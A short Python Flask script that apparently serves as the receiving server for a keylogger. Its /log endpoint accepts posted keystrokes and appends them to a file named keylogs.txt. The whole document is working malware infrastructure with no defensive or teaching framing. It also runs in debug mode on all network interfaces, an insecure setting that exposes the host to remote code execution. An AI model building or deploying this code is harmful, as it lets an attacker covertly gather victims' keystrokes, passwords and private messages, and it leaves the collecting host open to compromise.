from flask import Flask, request

app = Flask(__name__)

@app.route('/log', methods=['POST'])
def log_data():
    key_logged = request.form.get('key')
    if key_logged:
        with open('keylogs.txt', 'a') as f:
            f.write(key_logged + '\n')
        return 'Key logged successfully!'
    else:
        return 'No key logged.'

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=8080)
